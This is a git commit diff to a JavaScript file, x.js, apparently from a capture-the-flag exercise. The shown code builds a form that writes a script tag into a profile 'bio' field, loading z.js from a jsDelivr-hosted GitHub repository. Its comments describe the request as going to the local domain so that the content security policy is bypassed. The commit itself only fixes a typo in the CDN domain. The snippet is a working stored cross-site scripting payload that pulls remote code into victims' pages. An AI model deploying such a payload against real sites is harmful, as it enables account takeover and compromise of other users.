47310f7e641148592b87241aae0d4f0091a681eb
Lucca Musomecci <74316806+notluken@users.noreply.github.com>
2025-10-05 18:36:11 -0300

    Update x.js

--- x.js
+++ x.js
@@ -1,7 +1,7 @@
 (function() {
   var form = new FormData();
     // Reemplaza '¡Biografía de Jeni comprometida!' por el texto del CTF
-  form.append('bio', '<script src="https://cdn.jsdelivr.bet/gh/notluken/vtf@main/z.js"></script>'); 
+  form.append('bio', '<script src="https://cdn.jsdelivr.net/gh/notluken/vtf@main/z.js"></script>'); 
   form.append('profile_pic', new Blob([''], {type: 'application/octet-stream'}), '');
 
     // ¡La petición es al dominio local, evitando el CSP!
